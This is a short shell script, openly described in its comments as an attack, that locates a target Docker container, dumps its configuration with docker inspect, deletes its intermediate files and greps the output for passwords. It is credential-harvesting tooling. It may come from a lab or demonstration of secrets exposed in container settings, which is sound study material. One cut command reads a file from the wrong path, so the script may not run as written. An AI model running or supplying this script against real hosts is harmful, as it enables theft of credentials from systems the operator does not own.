#!/bin/sh

#List the running containers and find the one we want to attack
docker ps | grep attacked_container > /Attack/dockerps
#Keed the container id
cut -d' ' -f1 dockerps > /Attack/containerid
container_id=$(cat /Attack/containerid)
#Find information about this container
docker inspect ${container_id} > /Attack/inspect_output

#Clear the files used
rm /Attack/dockerps
rm /Attack/containerid

#Print any information that includes keyword Password
cat /Attack/inspect_output | grep Password
